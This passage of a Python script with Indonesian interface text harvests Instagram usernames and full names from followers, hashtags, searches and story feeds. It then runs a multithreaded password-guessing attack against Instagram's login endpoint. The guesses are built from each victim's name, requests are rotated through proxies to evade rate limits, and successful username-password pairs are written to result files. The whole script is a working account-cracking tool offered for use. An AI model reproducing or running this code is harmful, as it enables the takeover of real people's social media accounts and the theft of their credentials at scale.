            ___file.write(z['username']+'<=>'+z['full_name']+'  \n')
            print("\r"+z['username']+"<=>"+z['full_name'])
        ___file.close()
        print("\r%s                   "%(P))
        print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
        print("%s[%s?%s]%s Total User :%s %s"%(H,P,H,P,K,len(open('Dump/'+___nama,'r').readlines())))
        print("%s[%s?%s]%s File Tersimpan Di :%s Dump/%s"%(H,P,H,P,K,___nama))
        input("%s[%sKembali%s]"%(K,P,K));___menu___()
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Dump Pengikut
def ___pengikut___():
    global ___header___,ses
    try:
        ___head = ___header___()
        ___user___ = input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
        if ___user___ in ['',' ']:
            exit("%s[%s!%s]%s Jangan Kosong"%(P,M,P,M))
        __res = requests.get('https://www.instagram.com/'+___user___+'/?__a=1', headers=___head).json()['graphql']['user']
        ___nama = __res['full_name'].replace(' ','_') + '.txt'
        print("%s[%s?%s]%s Nama :%s %s"%(B,P,B,P,H,__res['full_name']))
        print("%s[%s?%s]%s Pengikut :%s %s"%(B,P,B,P,H,__res['edge_followed_by']['count']))
        print("%s   "%(P))
    except (KeyError):
        exit("%s[%s!%s]%s User Tidak Ditemukan"%(P,M,P,M))
    try:
        __sep = ses.get('https://i.instagram.com/api/v1/friendships/'+__res['id']+'/followers/?count=5000', headers=___head)
        ___file = open('Dump/'+___nama, 'w')
        for z in json.loads(__sep.text)["users"]:
            ___file.write(z['username']+'<=>'+z['full_name']+'  \n')
            print("\r"+z['username']+"<=>"+z['full_name'])
        ___file.close()
        print("\r%s                   "%(P))
        print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
        print("%s[%s?%s]%s Total User :%s %s"%(H,P,H,P,K,len(open('Dump/'+___nama,'r').readlines())))
        print("%s[%s?%s]%s File Tersimpan Di :%s Dump/%s"%(H,P,H,P,K,___nama))
        input("%s[%sKembali%s]"%(K,P,K));___menu___()
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Dump Beranda
def ___beranda___():
    global ___header___,ses
    try:
        ___head = ___header___()
        ___user___ = input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
        if ___user___ in ['',' ']:
            exit("%s[%s!%s]%s Jangan Kosong"%(P,M,P,M))
        __res = requests.get('https://www.instagram.com/'+___user___+'/?__a=1', headers=___head).json()['graphql']['user']
        ___nama = __res['full_name'].replace(' ','_') + '.txt'
        print("%s[%s?%s]%s Nama :%s %s"%(B,P,B,P,H,__res['full_name']))
        print("%s   "%(P))
    except (KeyError):
        exit("%s[%s!%s]%s User Tidak Ditemukan"%(P,M,P,M))
    try:
        __sep = ses.get("https://i.instagram.com/api/v1/feed/reels_tray/", headers=___head).json()
        ___file = open('Dump/'+___nama, 'w')
        for z in __sep['tray']:
            ___file.write(z['user']['username']+'<=>'+z['user']['full_name']+'  \n')
            print("\r"+z['user']['username']+"<=>"+z['user']['full_name'])
        ___file.close()
        print("\r%s                   "%(P))
        print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
        print("%s[%s?%s]%s Total User :%s %s"%(H,P,H,P,K,len(open('Dump/'+___nama,'r').readlines())))
        print("%s[%s?%s]%s File Tersimpan Di :%s Dump/%s"%(H,P,H,P,K,___nama))
        input("%s[%sKembali%s]"%(K,P,K));___menu___()
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Dump Hastag
def ___hastag___():
    global ___header___,ses
    try:
        ___head = ___header___()
        ___tag___ = input("\n%s[%s?%s]%s Hastag :%s "%(B,P,B,P,H)).replace('#','')
        ___nama = input("%s[%s?%s]%s File :%s "%(B,P,B,P,H))
        __sep = ses.get('https://i.instagram.com/api/v1/feed/tag/'+___tag___+'/?rank_token=caf8d67a-5140-4fcd-a795-e2a9047dc5d9', headers=___head).json()
        ___file = open('Dump/'+___nama, 'w')
        print("%s   "%(P))
        for z in __sep['ranked_items']:
            ___file.write(z['user']['username']+'<=>'+z['user']['full_name']+'  \n')
            print("\r"+z['user']['username']+"<=>"+z['user']['full_name'])
        ___file.close()
        print("\r%s                   "%(P))
        print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
        print("%s[%s?%s]%s Total User :%s %s"%(H,P,H,P,K,len(open('Dump/'+___nama,'r').readlines())))
        print("%s[%s?%s]%s File Tersimpan Di :%s Dump/%s"%(H,P,H,P,K,___nama))
        input("%s[%sKembali%s]"%(K,P,K));___menu___()
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Dump Search
def ___search___():
    global ___header___,ses
    try:
        ___head = ___header___()
        ___user___ = input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
        if ___user___ in ['',' ']:
            exit("%s[%s!%s]%s Jangan Kosong"%(P,M,P,M))
        __res = requests.get('https://www.instagram.com/'+___user___+'/?__a=1', headers=___head).json()['graphql']['user']
        ___nama = __res['full_name'].replace(' ','_') + '.txt'
        print("%s[%s?%s]%s Nama :%s %s"%(B,P,B,P,H,__res['full_name']))
        print("%s   "%(P))
        __sep = ses.get('https://i.instagram.com/api/v1/fbsearch/accounts_recs/?target_user_id='+__res['id']+'&include_friendship_status=true',headers=___head).json()
        ___file = open('Dump/'+___nama, 'w')
        for z in __sep['users']:
            ___file.write(z['username']+'<=>'+z['full_name']+'  \n')
            print("\r"+z['username']+"<=>"+z['full_name'])
        ___file.close()
        print("\r%s                   "%(P))
        print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
        print("%s[%s?%s]%s Total User :%s %s"%(H,P,H,P,K,len(open('Dump/'+___nama,'r').readlines())))
        print("%s[%s?%s]%s File Tersimpan Di :%s Dump/%s"%(H,P,H,P,K,___nama))
        input("%s[%sKembali%s]"%(K,P,K));___menu___()
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Dump Query
def ___query___():
    global ___header___,ses
    try:
        ___head = ___header___()
        ___nama = input("\n%s[%s?%s]%s Query :%s "%(B,P,B,P,H)).replace(' ','')
        ___limit___ = input("%s[%s?%s]%s Limit :%s "%(B,P,B,P,H))
        __sep = ses.get('https://www.instagram.com/web/search/topsearch/?context=blended&query='+___nama+'&rank_token=0.3953592318270893&count='+___limit___, headers=___head).json()
        ___file = open('Dump/'+___nama+'.txt', 'w')
        print("%s   "%(P))
        for z in __sep['users']:
            ___file.write(z['user']['username']+'<=>'+z['user']['full_name']+'  \n')
            print("\r"+z['user']['username']+"<=>"+z['user']['full_name'])
        ___file.close()
        print("\r%s                   "%(P))
        print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
        print("%s[%s?%s]%s Total User :%s %s"%(H,P,H,P,K,len(open('Dump/'+___nama+'.txt','r').readlines())))
        print("%s[%s?%s]%s File Tersimpan Di :%s Dump/%s"%(H,P,H,P,K,___nama+'.txt'))
        input("%s[%sKembali%s]"%(K,P,K));___menu___()
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Dump Email
def ___email___():
    try:
        ___user___ = input("\n%s[%s?%s]%s Nama :%s "%(B,P,B,P,H)).replace(' ','')
        ___nama = ___user___+'.txt'
        ___limit___ = int(input("%s[%s?%s]%s Limit :%s "%(B,P,B,P,H)))
        if ___limit___ >= 1001:
            exit("%s[%s!%s]%s Maksimal 1000"%(P,M,P,M))
        ___email___ = input("%s[%s?%s]%s Domain :%s "%(B,P,B,P,H))
        print("%s   "%(P))
        if ___email___ in ['@gmail.com','@yahoo.com','@hotmail.com','@email.com','@mail.com','@outlook.com','@yandex.com']:
            ___file = open('Dump/'+___nama, 'w')
            for z in range(___limit___):
                ___nomor = random.randint(1, 999)
                email___ = ___user___+str(___nomor)+___email___+'<=>'+___user___+' '+str(___nomor)+'  '
                ___file.write(email___+'\n')
                print('\r'+email___)
            ___file.close()
            print("\r%s                   "%(P))
            print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
            print("%s[%s?%s]%s Total User :%s %s"%(H,P,H,P,K,len(open('Dump/'+___nama,'r').readlines())))
            print("%s[%s?%s]%s File Tersimpan Di :%s Dump/%s"%(H,P,H,P,K,___nama))
            input("%s[%sKembali%s]"%(K,P,K));___menu___()
        else:
            exit("%s[%s!%s]%s Domain : @gmail.com,@yahoo.com,@hotmail.com,@email.com,@mail.com,@outlok.com,@yandex.com"%(P,M,P,M))
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
# Pilih Password
def ___password___():
    print("\n%s[%s1%s]%s Gunakan Password %s{%sName123,Name12345%s}"%(B,P,B,P,H,P,H))
    print("%s[%s2%s]%s Gunakan Password %s{%sName,Name123,Name12345%s}"%(B,P,B,P,H,P,H))
    print("%s[%s3%s]%s Gunakan Password %s{%sName,Name123,Name1234,Name12345,Name123456%s}"%(B,P,B,P,H,P,H))
    print("%s[%s4%s]%s Gunakan Password Manual %s{%s>5%s}"%(B,P,B,P,H,P,H))
    ___pilih___ = input("\n%s[%s?%s]%s Choose :%s "%(H,P,H,P,K))
    if ___pilih___ in ['4','04']:
        print("%s[%s!%s]%s Gunakan (,) Untuk Password Yang Berbeda"%(M,P,M,P))
        pws = input("%s[%s?%s]%s Password :%s "%(H,P,H,P,K)).split(',')
        if pws <=5:
            exit("%s[%s!%s]%s Password Lebih Dari 6 Karakter"%(P,M,P,M))
    try:
        ___file___ = input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,K))
        ___list = open(___file___,'r').read().splitlines()
    except (IOError):
        exit("%s[%s!%s]%s File Tidak Ada"%(P,M,P,M))
    print("\n%s[%s•%s]%s Hasil Ok Tersimpan Di :%s Results/Ok.txt"%(B,P,B,P,H))
    print("%s[%s•%s]%s Hasil Cp Tersimpan Di :%s Results/Cp.txt\n"%(B,P,B,P,K))
    with ThreadPoolExecutor(max_workers=30) as (hayuk):
        for v in ___list:
            user, name = v.split('<=>')
            z = name.split(' ')
            if ___pilih___ in ['1','01']:
                pwx = [z[0]+'123', z[0]+'12345', z[1]+'123', z[1]+'12345']
            elif ___pilih___ in ['2','02']:
                pwx = [name.replace(' ',''), z[0]+'123', z[0]+'12345', z[1]+'123', z[1]+'12345']
            elif ___pilih___ in ['3','03']:
                pwx = [name.replace(' ',''), z[0]+'123', z[0]+'1234', z[0]+'12345', z[0]+'123456', z[1]+'123', z[1]+'1234', z[1]+'12345', z[1]+'123456']
            elif ___pilih___ in ['4','04']:
                pwx = pws
            else:
                pwx = [name.replace(' ',''), z[0]+'123', z[0]+'12345', z[1]+'123', z[1]+'12345']
            hayuk.submit(___crack___, ___list, user, pwx)
    exit("\r%s[%sSelesai%s]%s                        "%(H,P,H,P))
# Crack Instagram
def ___crack___(total,user,pwx):
    global loop, ses, ok, cp
    try:
        ua = random.choice(open("Data/ua.txt","r").read().splitlines())
    except (IOError):
        ua = ('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36')
    sys.stdout.write(
        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s     "%(loop, len(total), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            pw = pw.lower()
            ___head ={'user-agent': 'Mozilla/5.0 (Linux; Android 10; HD1907 Build/QKQ1.190716.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36 Instagram 119.0.0.33.147 Android (29/10; 420dpi; 1080x2291; OnePlus; HD1907; OnePlus7TTMO; qcom; en_US; 182747397)','cookie': open('kuki.txt','r').read()}
            proxy = random.choice(open("Data/proxy.txt","r").read().splitlines())
            header = {
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.8',
                'Connection': 'keep-alive',
                'Content-Length': '0',
                'Host': 'www.instagram.com',
                'Referer': 'https://www.instagram.com/',
                'User-Agent': ua,
                'X-Instagram-AJAX': '1',
                'X-Requested-With': 'XMLHttpRequest'
                }
            ses.headers.update(header)
            ses.cookies.update({
                'sessionid': '', 'mid': '', 'ig_pr': '1',
                'ig_vw': '1920', 'csrftoken': '',
                's_network': '', 'ds_user_id': ''
                })
            ses.get('https://www.instagram.com/web/__mid')
            ses.headers.update({'X-CSRFToken': ses.cookies.get_dict()['csrftoken']})
            enc_pass = '#PWD_INSTAGRAM_BROWSER:0:{}:{}'.format(int(time.time()), pw)
            data_post = {
                "username": user,
                "enc_password": enc_pass
                }
            req = ses.post("https://www.instagram.com/accounts/login/ajax/", headers=header, data=data_post, proxies={'http': f'socks4://{proxy}'}, allow_redirects=True).json()
            if 'userId' in str(req):
                try:
                    __vox = requests.get('https://www.instagram.com/'+user+'/?__a=1', headers=___head).json()['graphql']['user']
                    nm = __vox['full_name']
                    mk = __vox['edge_followed_by']['count']
                except (KeyError, IOError):
                    nm = ' -'
                    mk = ' -'
                except:pass
                print("\r%s[%s✔%s]%s Status :%s Success               "%(B,H,B,P,H))
                print("%s[>] Nama : %s"%(P,nm))
                print("%s[>] Pengikut : %s"%(P,mk))
                print("%s[>] Username : %s"%(P,user))
                print("%s[>] Password : %s\n"%(P,pw))
                ok.append("%s|%s"%(user,pw))
                open('Results/Ok.txt','a').write("%s|%s\n"%(user,pw))
                break
                continue
            elif 'checkpoint' in str(req):
                try:
                    __vox = requests.get('https://www.instagram.com/'+user+'/?__a=1', headers=___head).json()['graphql']['user']
                    nm = __vox['full_name']
                    mk = __vox['edge_followed_by']['count']
                except (KeyError, IOError):
                    nm = ' -'
                    mk = ' -'
                except:pass
                print("\r%s[%s✘%s]%s Status :%s Checkpoint               "%(B,K,B,P,K))
                print("%s[>] Nama : %s"%(P,nm))
                print("%s[>] Pengikut : %s"%(P,mk))
                print("%s[>] Username : %s"%(P,user))
                print("%s[>] Password : %s\n"%(P,pw))
                cp.append("%s|%s"%(user,pw))
                open('Results/Cp.txt','a').write("%s|%s\n"%(user,pw))
                break
                continue
            elif 'Please wait' in str(req):
                sys.stdout.write(
                    "\r%s[%s!%s]%s Gunakan Mode Pesawat 2 Detik"%(P,M,P,M)),
                sys.stdout.flush();sleep(7)
                ___crack___(total,user,pwx)
            else:
                continue
        loop +=1
    except (ConnectionError):
        sys.stdout.write(
            "\r%s[%s!%s]%s Koneksi Error                "%(P,K,P,K)),
        sys.stdout.flush();sleep(5)
        ___crack___(total,user,pwx)

if __name__ == '__main__':
    os.system('git pull')
    moch_yayan()
